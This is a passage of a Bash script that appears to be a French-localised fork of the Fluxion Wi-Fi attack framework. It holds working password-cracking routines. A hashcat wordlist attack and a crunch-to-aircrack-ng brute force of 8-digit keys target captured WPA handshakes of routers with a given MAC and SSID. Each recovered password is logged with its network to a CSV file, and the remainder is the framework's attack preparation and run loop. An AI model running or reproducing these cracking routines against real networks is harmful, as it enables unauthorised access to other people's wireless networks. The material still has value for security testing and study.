    "hashcat -m $hashMode -a 0 '$hccapxFile' '$wordlistFile' --outfile='$resultFile' --outfile-format=2 -O 2>&1; echo 'Terminé. Appuyez sur Entrée...'; read" &
  local crackPID=$!
  
  # Wait and check result
  wait $crackPID
  
  if [ -f "$resultFile" ] && [ -s "$resultFile" ]; then
    local found=$(cat "$resultFile" | head -1)
    fluxion_show_password_found "$found" "$targetSSID" "$targetMAC"
  else
    echo -e "\n${CRed}Mot de passe non trouvé.${CClr}"
  fi
  
  rm -f "$wordlistFile" "$hccapxFile"
  
  echo ""
  echo -e "$FLUXIONVLine Appuyez sur Entrée..."
  read
}

# ============================================================ #
# ============= < Bruteforce Patterns Method > =============== #
# ============================================================ #
fluxion_bruteforce_patterns() {
  local hashPath="$1"
  local targetMAC="$2"
  local targetSSID="$3"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  local resultFile="/tmp/fluxion_result.txt"
  
  fluxion_header
  echo -e "$FLUXIONVLine ${CGrn}=== BRUTEFORCE ZTE PATTERNS ===${CClr}"
  echo -e "$FLUXIONVLine ${CYel}ATTENTION: Cette méthode peut prendre des heures!${CClr}"
  echo
  
  # Only test 8-digit numeric (the most common and fastest)
  echo -e "$FLUXIONVLine Test: 8 chiffres (00000000-99999999)"
  echo -e "$FLUXIONVLine Estimation: ~30-60 min avec CPU"
  echo
  
  rm -f "$resultFile"
  
  xterm -hold -bg "#000000" -fg "#00FF00" \
    -title "Bruteforce: 8 digits (0-9)" -e \
    "crunch 8 8 0123456789 2>/dev/null | aircrack-ng -b '$targetMAC' -w - '$hashPath' 2>&1 | tee '$resultFile'" &
  local crackPID=$!
  
  # Monitor
  while kill -0 $crackPID 2>/dev/null; do
    sleep 2
    if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
      local found=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
      kill $crackPID 2>/dev/null
      fluxion_show_password_found "$found" "$targetSSID" "$targetMAC"
      return 0
    fi
  done
  
  # Check final
  if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
    local found=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
    fluxion_show_password_found "$found" "$targetSSID" "$targetMAC"
  else
    echo -e "\n${CRed}Mot de passe non trouvé avec 8 chiffres.${CClr}"
  fi
  
  echo ""
  echo -e "$FLUXIONVLine Appuyez sur Entrée..."
  read
}

# ============================================================ #
# ============= < Display Password Found > =================== #
# ============================================================ #
fluxion_show_password_found() {
  local password="$1"
  local ssid="$2"
  local mac="$3"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  # Save to file
  mkdir -p "$FLUXIONPath/attacks/Bruteforce/cracked"
  echo "$(date '+%Y-%m-%d %H:%M:%S'),$ssid,$mac,$password" >> \
    "$FLUXIONPath/attacks/Bruteforce/cracked/passwords.csv"
  
  echo ""
  echo -e "${CGrn}╔═══════════════════════════════════════════════════╗${CClr}"
  echo -e "${CGrn}║         🔓 MOT DE PASSE TROUVÉ! 🔓                ║${CClr}"
  echo -e "${CGrn}╠═══════════════════════════════════════════════════╣${CClr}"
  echo -e "${CGrn}║  Réseau: $ssid${CClr}"
  echo -e "${CGrn}║  MAC: $mac${CClr}"
  echo -e "${CGrn}╠═══════════════════════════════════════════════════╣${CClr}"
  echo -e "${CGrn}║  PASSWORD: $password${CClr}"
  echo -e "${CGrn}╚═══════════════════════════════════════════════════╝${CClr}"
  echo ""
  echo -e "${CYel}Sauvegardé dans: attacks/Bruteforce/cracked/passwords.csv${CClr}"
}

fluxion_unprep_attack() {
  if type -t unprep_attack &> /dev/null; then
    unprep_attack
  fi

  IOUtilsHeader="fluxion_header"

  # Remove any lingering targetting subroutines loaded.
  unset attack_targetting_interfaces
  unset attack_tracking_interfaces

  # Remove any lingering restoration subroutines loaded.
  unset load_attack
  unset save_attack

  FluxionTargetTrackerInterface=""

  return 1 # Trigger another undo since prep isn't significant.
}

fluxion_prep_attack() {
  local -r path="$FLUXIONPath/attacks/$FluxionAttack"

  if [ ! -x "$path/attack.sh" ]; then return 1; fi
  if [ ! -x "$path/language/$FluxionLanguage.sh" ]; then return 2; fi

  # Load attack parameters if any exist.
  if [ "$AttackCLIArguments" ]; then
    eval set -- "$AttackCLIArguments"
    # Remove them after loading them once.
    unset AttackCLIArguments
  fi

  # Load attack and its corresponding language file.
  # Load english by default to overwrite globals that ARE defined.
  source "$path/language/en.sh"
  if [ "$FluxionLanguage" != "en" ]; then
    source "$path/language/$FluxionLanguage.sh"
  fi
  source "$path/attack.sh"

  # Check if attack is targetted & set the attack target if so.
  if type -t attack_targetting_interfaces &> /dev/null; then
    echo "Calling fluxion_target_set" >> "$FLUXIONOutputDevice"
    if ! fluxion_target_set; then 
      echo "fluxion_target_set FAILED" >> "$FLUXIONOutputDevice"
      return 3
    fi
    echo "fluxion_target_set SUCCESS" >> "$FLUXIONOutputDevice"
  fi

  # Check if attack provides tracking interfaces, get & set one.
  # TODO: Uncomment the lines below after implementation.
  echo "Checking for attack_tracking_interfaces" >> "$FLUXIONOutputDevice"
  if type -t attack_tracking_interfaces &> /dev/null; then
    echo "Calling fluxion_target_set_tracker" >> "$FLUXIONOutputDevice"
    if ! fluxion_target_set_tracker; then 
      echo "fluxion_target_set_tracker FAILED" >> "$FLUXIONOutputDevice"
      return 4
    fi
    echo "fluxion_target_set_tracker SUCCESS" >> "$FLUXIONOutputDevice"
  fi

  # If attack is capable of restoration, check for configuration.
  if type -t load_attack &> /dev/null; then
    # If configuration file available, check if user wants to restore.
    if [ -f "$path/attack.conf" ]; then
      local choices=( \
        "$FLUXIONAttackRestoreOption" \
        "$FLUXIONAttackResetOption" \
      )

      io_query_choice "$FLUXIONAttackResumeQuery" choices[@]

      if [ "$IOQueryChoice" = "$FLUXIONAttackRestoreOption" ]; then
        load_attack "$path/attack.conf"
      fi
    fi
  fi

  if ! prep_attack; then return 5; fi

  # Save the attack for user's convenience if possible.
  if type -t save_attack &> /dev/null; then
    save_attack "$path/attack.conf"
  fi
}

fluxion_run_attack() {
  start_attack
  fluxion_target_tracker_start

  local choices=( \
    "$FLUXIONSelectAnotherAttackOption" \
    "$FLUXIONGeneralExitOption" \
  )

  io_query_choice \
    "$(io_dynamic_output $FLUXIONAttackInProgressNotice)" choices[@]

  echo

  # IOQueryChoice is a global, meaning, its value is volatile.
  # We need to make sure to save the choice before it changes.
  local choice="$IOQueryChoice"

  fluxion_target_tracker_stop


  # could execute twice
  # but mostly doesn't matter
  if [ ! -x "$(command -v systemctl)" ]; then
    if [ "$(systemctl list-units | grep systemd-resolved)" != "" ];then
        systemctl restart systemd-resolved.service
    fi
  fi

  if [ -x "$(command -v service)" ];then
    if service --status-all | grep -Fq 'systemd-resolved'; then
      sudo service systemd-resolved.service restart
    fi
  fi

  stop_attack

  if [ "$choice" = "$FLUXIONGeneralExitOption" ]; then
    fluxion_handle_exit
  fi

  fluxion_unprep_attack
  fluxion_unset_attack
}

# ============================================================ #
# ================= < Argument Executables > ================= #
# ============================================================ #
eval set -- "$FLUXIONCLIArguments" # Set environment parameters.
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -t|--target) echo "Not yet implemented!"; sleep 3; fluxion_shutdown;;
  esac
  shift # Shift new parameters
done

# ============================================================ #
# ===================== < FLUXION Loop > ===================== #
# ============================================================ #
fluxion_main() {
  fluxion_startup

  fluxion_set_resolution

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_language"
    "set_attack"
    "prep_attack"
    "run_attack"
  )

  while true; do # Fluxion's runtime-loop.
    fluxion_do_sequence fluxion sequence[@]
  done

  fluxion_shutdown
}

fluxion_main # Start Fluxion

# FLUXSCRIPT END
